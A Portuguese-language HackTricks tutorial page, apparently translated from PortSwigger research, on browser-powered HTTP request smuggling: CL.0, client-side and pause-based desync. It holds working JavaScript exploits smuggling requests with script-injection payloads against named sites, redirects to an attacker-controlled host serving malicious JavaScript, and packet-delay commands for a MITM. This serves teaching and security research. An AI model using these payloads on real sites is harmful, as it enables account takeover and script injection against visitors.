# Browser HTTP Request Smuggling

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Voc√™ trabalha em uma **empresa de seguran√ßa cibern√©tica**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? ou voc√™ quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para o** [**reposit√≥rio hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**reposit√≥rio hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Desvio de solicita√ß√£o HTTP do navegador

<details>
<summary>Tradu√ß√£o para refer√™ncia</summary>

Esta vulnerabilidade ocorre quando o cabe√ßalho **Content Length** (CL) √© completamente **ignorado** pelo **servidor backend**. Em seguida, o back-end trata o **corpo** como o **in√≠cio do m√©todo da segunda solicita√ß√£o**. Ignorar o CL √© equivalente a trat√°-lo como tendo um valor de 0, portanto, este √© um desvio CL.0 - uma classe de ataque [conhecida](https://i.blackhat.com/USA-20/Wednesday/us-20-Klein-HTTP-Request-Smuggling-In-2020-New-Variants-New-Defenses-And-New-Challenges.pdf), mas menos explorada.

![](<../../.gitbook/assets/image (3) (1) (2).png>)

O ataque foi poss√≠vel porque o servidor back-end simplesmente **n√£o esperava uma solicita√ß√£o POST**.

{% hint style="warning" %}
Observe que essa vulnerabilidade est√° sendo **acionada** por uma solicita√ß√£o HTTP completamente **v√°lida** e compat√≠vel com a especifica√ß√£o. Isso significa que o **front-end n√£o tem chance de proteger** contra ela e at√© mesmo um navegador pode acion√°-la.
{% endhint %}

A √∫nica **diferen√ßa** entre **CL.0** e **H2.0** √© que o segundo est√° usando **HTTP2** (que tem um cabe√ßalho de comprimento de conte√∫do impl√≠cito), mas o **backend tamb√©m n√£o est√° usando isso**.

## Desvio do lado do cliente

Os ataques de desvio tradicionais **envenenam** a **conex√£o** entre um servidor **front-end e back-end**, portanto, s√£o imposs√≠veis em sites que n√£o usam uma arquitetura front-end/back-end. A partir de agora, esses s√£o os desvios do lado do servidor. A maioria dos desvios do lado do servidor s√≥ pode ser acionada por um **cliente HTTP personalizado que emite uma solicita√ß√£o malformada**.

A capacidade de um **navegador causar um desvio** permite uma nova classe inteira de amea√ßas chamada **desvio do lado do cliente** (CSD).\
Um ataque CSD come√ßa com a **v√≠tima visitando o site do atacante**, que ent√£o faz com que o navegador envie **duas solicita√ß√µes de dom√≠nio cruzado para o site vulner√°vel**. A **primeira** solicita√ß√£o √© criada para **desviar a conex√£o do navegador** e fazer com que a **segunda solicita√ß√£o acione** uma resposta prejudicial, geralmente dando ao atacante o controle da conta da v√≠tima.

### Detectar

Um vetor CSD √© uma solicita√ß√£o HTTP com **duas** propriedades **chave**.

Primeiro, o **servidor deve ignorar o Content-Length (CL)** da solicita√ß√£o. Isso geralmente acontece porque a solicita√ß√£o **acionou um erro do servidor** ou o servidor simplesmente **n√£o esperava uma solicita√ß√£o POST** para o endpoint escolhido. Tente direcionar **arquivos est√°ticos** e **redirecionamentos de n√≠vel de servidor**, e acionar erros por meio de **URLs muito longos** e **semi-malformados** como /%2e%2e.

Em segundo lugar, a solicita√ß√£o deve ser **acion√°vel em um navegador da web de dom√≠nio cruzado**. Os navegadores restringem severamente o controle sobre solicita√ß√µes de dom√≠nio cruzado, portanto, voc√™ tem controle limitado sobre cabe√ßalhos e, se sua solicita√ß√£o tiver um corpo, precisar√° usar o m√©todo HTTP POST. Em √∫ltima an√°lise, voc√™ s√≥ **controla** a **URL**, al√©m de algumas coisas como o cabe√ßalho **Referer**, o **corpo** e a **√∫ltima parte do Content-Type**.

#### Testando a ignor√¢ncia do CL

A maneira de testar essa configura√ß√£o incorreta √© **enviar 2 solicita√ß√µes e desviar uma** no **meio**. Se a conex√£o **desviada** afetou a resposta da **segunda solicita√ß√£o**, significa que ela √© **vulner√°vel**:

![](<../../.gitbook/assets/image (1) (2) (2) (1).png>)

{% hint style="warning" %}
Observe que voc√™ **n√£o pode** testar essa vulnerabilidade apenas enviando um **Content-Length maior** do que o enviado e **procurando um tempo limite** porque alguns servidores **respondem** mesmo se eles **n√£o receberam todo o corpo**.
{% endhint %}

√â importante observar se o site de destino suporta HTTP/2. Os ataques CSD geralmente exploram a reutiliza√ß√£o de conex√£o HTTP/1.1 e os navegadores da web **preferem usar HTTP/2 sempre que poss√≠vel**, portanto, se o site de destino suportar HTTP/2, seus ataques provavelmente n√£o funcionar√£o. H√° uma **exce√ß√£o**; alguns **proxies avan√ßados n√£o suportam HTTP/2**, ent√£o voc√™ pode explorar qualquer pessoa que os use. Isso inclui proxies corporativos, certas VPNs intrusivas e at√© algumas ferramentas de seguran√ßa.

### Confirmar

Primeiro, selecione um site para lan√ßar o ataque. Este site deve ser **acessado por HTTPS** e localizado em um **dom√≠nio diferente do alvo**.

Em seguida, certifique-se de que **n√£o tem um proxy configurado**, em seguida, navegue at√© o seu site de ataque. Abra as **ferramentas do desenvolvedor** e mude para a **guia Rede**. Para ajudar na depura√ß√£o de poss√≠veis problemas posteriormente, recomendo fazer os seguintes ajustes:

* Selecione a caixa de sele√ß√£o **"Preservar log"**.
* Clique com o bot√£o direito do mouse nos cabe√ßalhos das colunas e **ative a coluna "ID de conex√£o"**.

Mude para o console do desenvolvedor e execute JavaScript para replicar sua sequ√™ncia de ataque usando fetch(). Isso pode parecer algo como:
</details>
```javascript
fetch('https://example.com/', {
  method: 'POST',
     body: "GET /hopefully404 HTTP/1.1\r\nX: Y", // malicious prefix
     mode: 'no-cors', // ensure connection ID is visible
     credentials: 'include' // poison 'with-cookies' pool
}).then(() => {
     location = 'https://example.com/' // use the poisoned connection
})
```
Eu defini o modo de busca **'no-cors'** para garantir que o Chrome **exiba o ID de conex√£o** na guia de Rede. Tamb√©m defini **credentials: 'include'** porque o Chrome tem [**duas piscinas de conex√£o separadas**](https://www.chromium.org/developers/design-documents/network-stack/preconnect) - uma para solicita√ß√µes com cookies e outra para solicita√ß√µes sem. Geralmente, voc√™ deseja explorar **navega√ß√µes**, e essas **usam a piscina 'com-cookies'**, ent√£o vale a pena se acostumar a sempre envenenar essa piscina.

Quando voc√™ executar isso, dever√° ver **duas solicita√ß√µes** na guia de Rede com o **mesmo ID de conex√£o**, e a **segunda** deve acionar um **404**:

![](<../../.gitbook/assets/image (158) (2).png>)

Se isso funcionar conforme o esperado, parab√©ns - voc√™ encontrou uma dessincroniza√ß√£o do lado do cliente!

### Explora√ß√£o - Armazenar

Uma op√ß√£o √© identificar a funcionalidade no site de destino que permite **armazenar dados de texto**, e criar o prefixo para que os cookies, cabe√ßalhos de autentica√ß√£o ou senha da v√≠tima acabem sendo **armazenados em algum lugar que voc√™ possa recuper√°-los**. Este fluxo de ataque funciona [quase identicamente ao desvio de solicita√ß√£o do lado do servidor](https://portswigger.net/web-security/request-smuggling/exploiting#capturing-other-users-requests), ent√£o n√£o vou me deter nisso.

### Explora√ß√£o - **Encadear e girar**

Em circunst√¢ncias normais, muitas classes de **ataque do lado do servidor** s√≥ podem ser lan√ßadas por um invasor com acesso direto ao site de destino, pois **dependem de solicita√ß√µes HTTP que os navegadores se recusam a enviar**, como **manipula√ß√£o** de **cabe√ßalhos HTTP** - envenenamento de cache da web, a maioria dos desvios de solicita√ß√£o do lado do servidor, ataques de cabe√ßalho de host, baseados em User-Agent [SQLi](https://portswigger.net/web-security/sql-injection), CSRF JSON Content-type e muitos outros.

O caminho mais simples para um ataque bem-sucedido veio de duas t√©cnicas-chave geralmente usadas para ataques de dessincroniza√ß√£o do lado do servidor: [**envenenamento de recursos JavaScript via redirecionamentos de cabe√ßalho de host**](https://portswigger.net/web-security/request-smuggling/exploiting#using-http-request-smuggling-to-turn-an-on-site-redirect-into-an-open-redirect), e usando o [**m√©todo HEAD**](https://portswigger.net/web-security/request-smuggling/advanced/request-tunnelling#non-blind-request-tunnelling-using-head) para emendar uma resposta com HTML prejudicial. Ambas as t√©cnicas precisavam ser **adaptadas** para superar alguns desafios novos associados √† opera√ß√£o no **navegador da v√≠tima**.

## Exemplos de explora√ß√£o

### Exemplo de HEAD empilhado

* **Exploit colorido**

![](<../../.gitbook/assets/image (2) (3).png>)

* **Exploit JS**
```javascript
fetch('https://www.capitalone.ca/assets', {
    method: 'POST',
    // use a cache-buster to delay the response
    body: `HEAD /404/?cb=${Date.now()} HTTP/1.1\r\nHost: www.capitalone.ca\r\n\r\nGET /x?x=<script>alert(1)</script> HTTP/1.1\r\nX: Y`,
    credentials: 'include',
    mode: 'cors' // throw an error instead of following redirect
}).catch(() => {
    location = 'https://www.capitalone.ca/'
})va
```
Explica√ß√£o:

* **Abuso de CL.0** em /assets (ele redireciona para /assets/ e n√£o verifica o CL)
* **Contrabandear** uma solicita√ß√£o **HEAD** (porque as respostas HEAD ainda cont√™m um content-length)
* **Contrabandear** uma solicita√ß√£o **GET** cujo **conte√∫do** ser√° **refletido** na resposta com o payload.
  * Devido ao **content-length do req HEAD**, a **resposta** desta solicita√ß√£o ser√° o **corpo do req HEAD**
* Definir o **modo cors**. Normalmente, isso n√£o √© feito, mas neste caso, a **resposta** do servidor para o **POST** **inicial** √© um **redirecionamento** que, se **seguido**, o **exploit n√£o funcionar√°**. Portanto, o **modo cors** √© usado para **disparar** um **erro** e **redirecionar** a v√≠tima com o **`catch`**.

### **Redirecionamento de cabe√ßalho de host + envenenamento de cache do lado do cliente**

* **exploit JS**
```javascript
fetch('https://redacted/', {
    method: 'POST',
    body: "GET /+webvpn+/ HTTP/1.1\r\nHost: x.psres.net\r\nX: Y",
    credentials: 'include'}
).catch(() => { location='https://redacted/+CSCOE+/win.js' })
```
* Uma solicita√ß√£o para `/+webvpn+/` com um **dom√≠nio diferente no cabe√ßalho Host** √© respondida com um **redirecionamento** para `/+webvpn+/index.html` para aquele **dom√≠nio** dentro do cabe√ßalho Host.
* A localiza√ß√£o na **segunda** solicita√ß√£o √© definida como `/+CSCOE+/win.js` para **envenenar** o **cache** desse arquivo `.js`.
  * Esta solicita√ß√£o ser√° respondida com o redirecionamento de `/+webvpn+/` para o dom√≠nio do atacante com o caminho `/+webvpn+/index.html`.
* O **cache** de **`win.js`** ser√° **envenenado** com um **redirecionamento** para a p√°gina do **atacante**, mas tamb√©m a **v√≠tima** seguir√° o redirecionamento, pois foi atribu√≠do √† vari√°vel `location` e acabar√° na p√°gina da web do atacante.
* O atacante ent√£o **redirecionar√°** a **v√≠tima** para `https://redacted/+CSCOE+/logon.html`. Esta p√°gina importar√° `/+CSCOE+/win.js`. Cujo **cache √© um redirecionamento** para o servidor do **atacante**, portanto, o atacante pode **responder com um JS malicioso**.

A **v√≠tima** acessar√° a p√°gina do **atacante** **duas vezes**, na primeira ela **espera um HTML** que redirecione a v√≠tima de volta para `https://redacted/+CSCOE+/logon.html` e na segunda ela **espera c√≥digo javascript** (a carga √∫til). Um poliglota pode ser usado para servir ambas as respostas em apenas uma:
```
HTTP/1.1 200 OK
Content-Type: text/html

alert('oh dear')/*<script>location = 'https://redacted/+CSCOE+/logon.html'</script>*/
```
### Payload HEAD com TE chunked

Ao procurar por CSD, voc√™ tamb√©m pode **testar URLs semi-malformadas** como `/..%2f` ou `/%2f`.

* **Explora√ß√£o colorida**

![](<../../.gitbook/assets/image (5) (2) (1).png>)

* **Explora√ß√£o JS**
```javascript
fetch('https://www.verisign.com/%2f', { 
    method: 'POST',
    body: `HEAD /assets/languagefiles/AZE.html HTTP/1.1\r\nHost: www.verisign.com\r\nConnection: keep-alive\r\nTransfer-Encoding: chunked\r\n\r\n34d\r\nx`, 
    credentials: 'include',
    headers: {'Content-Type': 'application/x-www-form-urlencoded'
}}).catch(() => {
    let form = document.createElement('form')
    form.method = 'POST'
    form.action = 'https://www.verisign.com/robots.txt'
    form.enctype = 'text/plain'
    let input = document.createElement('input')
    input.name = '0\r\n\r\nGET /<svg/onload=alert(1)> HTTP/1.1\r\nHost: www.verisign.com\r\n\r\nGET /?aaaaaaaaaaaaaaa HTTP/1.1\r\nHost: www.verisign.com\r\n\r\n'
    input.value = ''
    form.appendChild(input)
    document.body.appendChild(form)
    form.submit()
}
```
* A p√°gina **`/%2f`** √© acessada para **explorar** a vulnerabilidade **CL.0**.
* Um pedido **HEAD** √© contrabandeado usando o cabe√ßalho **`Transfer-Encoding: chunked`**.
  * Esse cabe√ßalho √© necess√°rio nesse cen√°rio porque, caso contr√°rio, o **servidor se recusa a aceitar um pedido HEAD com um corpo**.
* Em seguida, o usu√°rio envia um POST cujo corpo cont√©m o **√∫ltimo chunk do pedido HEAD anterior** e um **novo pedido que √© contrabandeado** com **conte√∫do** (a carga √∫til JS) que ser√° **refletido** na resposta.
  * Portanto, o navegador tratar√° a **resposta ao HEAD** como a **resposta ao pedido POST** que tamb√©m **cont√©m** no **corpo** da resposta que **reflete** a **entrada** do usu√°rio no segundo pedido contrabandeado.

### Redirecionamento de cabe√ßalho de host + RC

* **JS Exploit**
```html
<script>
    function reset() {
        fetch('https://vpn.redacted/robots.txt', 
            {mode: 'no-cors', credentials: 'include'}
        ).then(() => {
            x.location = "https://vpn.redacted/dana-na/meeting/meeting_testjs.cgi?cb="+Date.now()
        })
        setTimeout(poison, 120) // worked on 140. went down to 110
    }

    function poison(){
        sendPoison()
        sendPoison()
        sendPoison()
        setTimeout(reset, 1000)
    }

    function sendPoison(){
        fetch('https://vpn.redacted/dana-na/css/ds_1234cb049586a32ce264fd67d524d7271e4affc0e377d7aede9db4be17f57fc1.css', 
            {
                method: 'POST',
                body: "GET /xdana-na/imgs/footerbg.gif HTTP/1.1\r\nHost: x.psres.net\r\nFoo: '+'a'.repeat(9826)+'\r\nConnection: keep-alive\r\n\r\n",
                mode: 'no-cors', 
                credentials: 'include'
            }
        )
    }

</script>
<a onclick="x = window.open('about:blank'); reset()">Start attack</a>
```
Neste caso, novamente, h√° um **redirecionamento de cabe√ßalho de host** que poderia ser usado para **sequestrar** uma importa√ß√£o de **JS**. No entanto, desta vez, o **redirecionamento n√£o √© armazen√°vel em cache**, ent√£o a **contamina√ß√£o de cache** do lado do cliente n√£o √© uma op√ß√£o.

Portanto, o ataque realizado far√° com que a **v√≠tima acesse a p√°gina vulner√°vel** em uma guia e, em seguida, **antes** da p√°gina tentar **carregar um arquivo JS**, **contamine** as conex√µes de **contrabando de soquete** (3 neste caso).\
Como o **tempo** tem que ser extremamente **preciso**, o ataque √© realizado contra uma **nova guia em cada itera√ß√£o** at√© que funcione.

{% hint style="warning" %}
Tenha em mente que, neste caso, `/meeting_testjs.cgi` foi atacado porque **carrega** um **Javascript** que est√° respondendo com um **404**, ent√£o n√£o est√° em cache. Em outros cen√°rios em que voc√™ tenta atacar um **JS que est√° em cache**, voc√™ precisa esperar que ele **desapare√ßa do cache** antes de lan√ßar um novo ataque.
{% endhint %}

Passos resumidos:

* Abra uma nova janela.
* Emita uma solicita√ß√£o inofensiva ao alvo para estabelecer uma conex√£o nova, tornando os tempos mais consistentes.
* Navegue na janela para a p√°gina de destino em /meeting\_testjs.cgi.
* 120ms depois, crie tr√™s conex√µes contaminadas usando o gadget de redirecionamento.
* 5ms depois, enquanto renderiza /meeting\_testjs.cgi, a v√≠tima tentar√° importar /appletRedirect.js e ser√° redirecionada para x.psres.net, que serve JS malicioso.
* Se n√£o, tente novamente o ataque.

## Desincroniza√ß√£o baseada em pausa <a href="#pause" id="pause"></a>

A pausa tamb√©m pode criar novas vulnerabilidades de desincroniza√ß√£o, **desencadeando implementa√ß√µes de tempo limite de solicita√ß√£o equivocadas**.

Assim, um atacante pode enviar uma solicita√ß√£o com **cabe√ßalhos indicando que h√° um corpo**, e ent√£o **esperar** que o **front-end expire antes de enviar o corpo**. Se o front-end expirar, mas **deixar a conex√£o aberta**, o **corpo** dessa solicita√ß√£o ser√° **tratado como uma nova solicita√ß√£o**.

### Exemplo: **Varnish**

O cache do Varnish tem um recurso chamado `synth()`, que permite emitir uma **resposta sem encaminhar** a solicita√ß√£o para o back-end. Aqui est√° um exemplo de regra sendo usada para bloquear o acesso a uma pasta:
```javascript
if (req.url ~ "^/admin") {
    return (synth(403, "Forbidden"));
}
```
Quando processa uma **solicita√ß√£o parcial** que corresponde a uma regra sint√©tica, o Varnish **expira** se n√£o receber dados por **15 segundos**. Quando isso acontece, ele **deixa a conex√£o aberta** para reutiliza√ß√£o, mesmo que tenha lido apenas metade da solicita√ß√£o do soquete. Isso significa que, se o **cliente seguir com a segunda metade** da solicita√ß√£o HTTP, ela ser√° interpretada como uma **nova solicita√ß√£o**.

Para desencadear uma dessincroniza√ß√£o baseada em pausa em um front-end vulner√°vel, comece enviando seus cabe√ßalhos, prometendo um corpo e, em seguida, apenas espere. Eventualmente, voc√™ receber√° uma resposta e, quando finalmente enviar o corpo da solicita√ß√£o, ele ser√° interpretado como uma nova solicita√ß√£o:

![](<../../.gitbook/assets/image (4) (3) (1).png>)

{% hint style="warning" %}
Aparentemente, isso foi corrigido em 25 de janeiro como [CVE-2022-23959](https://varnish-cache.org/security/VSV00008.html).
{% endhint %}

### Exemplo: **Apache**

Assim como o Varnish, ele √© vulner√°vel em **pontos finais onde o servidor gera a resposta por si s√≥**, em vez de deixar a aplica√ß√£o lidar com a solicita√ß√£o. Uma maneira como isso acontece √© com redirecionamentos em n√≠vel de servidor: `Redirect 301 / /en`

### Explora√ß√£o do lado do servidor <a href="#server" id="server"></a>

Se o servidor vulner√°vel (Apache ou Varnish, neste caso) estiver no back-end, √© necess√°rio um **front-end** que **transmita a solicita√ß√£o para o servidor de back-end** (cabe√ßalhos HTTP, neste caso) **sem armazenar em buffer** todo o corpo da solicita√ß√£o.

![](<../../.gitbook/assets/image (3) (3).png>)

Nesse caso, o atacante **n√£o receber√° o tempo limite de resposta at√© que tenha enviado o corpo**. Mas se ele conhece o tempo limite, isso n√£o deve ser um problema.

O Application Load Balancer (ALB) da Amazon ir√° **transmitir os dados da conex√£o conforme necess√°rio**, mas se ele **receber** a **resposta** para a **metade da solicita√ß√£o** (o tempo limite) **antes** de receber o **corpo**, ele **n√£o enviar√° o corpo**, ent√£o uma **condi√ß√£o de corrida** deve ser explorada aqui:

<figure><img src="../../.gitbook/assets/image (1) (1) (2) (1).png" alt=""><figcaption></figcaption></figure>

H√° uma complica√ß√£o adicional quando se trata de **explorar o Apache atr√°s do ALB** - **ambos os servidores** t√™m um **tempo limite padr√£o de 60 segundos**. Isso deixa uma **janela de tempo extremamente pequena** para enviar a segunda parte da solicita√ß√£o. O ataque RC foi bem-sucedido ap√≥s 66 horas.

### Explora√ß√£o MITM

Aparentemente, **n√£o √© poss√≠vel interromper uma solicita√ß√£o do navegador** para explorar uma vulnerabilidade de pausa-desincroniza√ß√£o. No entanto, voc√™ sempre pode **realizar um ataque MITM para pausar uma solicita√ß√£o** enviada pelo navegador. Observe que este ataque **n√£o depende de descriptografar** nenhum tr√°fego.

O fluxo do ataque √© muito **semelhante a um ataque de dessincroniza√ß√£o regular do lado do cliente**. O usu√°rio visita uma p√°gina controlada pelo atacante, que emite uma s√©rie de **solicita√ß√µes entre dom√≠nios** para a aplica√ß√£o de destino. A **primeira solicita√ß√£o HTTP** √© intencionalmente preenchida para ser t√£o **grande** que o sistema operacional **a divide em v√°rios pacotes TCP**, permitindo que um MITM ativo **atrase o pacote final**, desencadeando uma dessincroniza√ß√£o baseada em pausa. Devido ao preenchimento, o **atacante** pode **identificar** qual **pacote pausar** simplesmente com base no **tamanho**.

Do lado do cliente, parece um dessincroniza√ß√£o regular do lado do cliente usando o gadget HEAD, al√©m do preenchimento da solicita√ß√£o:
```javascript
let form = document.createElement('form')
form.method = 'POST'
form.enctype = 'text/plain'
form.action = 'https://x.psres.net:6082/redirect?'+"h".repeat(600)+ Date.now()
let input = document.createElement('input')
input.name = "HEAD / HTTP/1.1\r\nHost: x\r\n\r\nGET /redirect?<script>alert(document.domain)</script> HTTP/1.1\r\nHost: x\r\nFoo: bar"+"\r\n\r\n".repeat(1700)+"x"
input.value = "x"
form.append(input)
document.body.appendChild(form)
form.submit()
```
No sistema do atacante realizando o MITM cego, o atraso foi implementado usando tc-NetEm:
```bash
# Setup
tc qdisc add dev eth0 root handle 1: prio priomap

# Flag packets to 34.255.5.242 that are between 700 and 1300 bytes
tc filter add dev eth0 protocol ip parent 1:0 prio 1 basic \
match 'u32(u32 0x22ff05f2 0xffffffff at 16)' \
and 'cmp(u16 at 2 layer network gt 0x02bc)' \
and 'cmp(u16 at 2 layer network lt 0x0514)' \
flowid 1:3

# Delay flagged packets by 61 seconds
tc qdisc add dev eth0 parent 1:3 handle 10: netem delay 61s
```
## **Refer√™ncias**

* Todas as informa√ß√µes deste post foram retiradas de [https://portswigger.net/research/browser-powered-desync-attacks](https://portswigger.net/research/browser-powered-desync-attacks)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Voc√™ trabalha em uma **empresa de seguran√ßa cibern√©tica**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para o** [**reposit√≥rio hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**reposit√≥rio hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
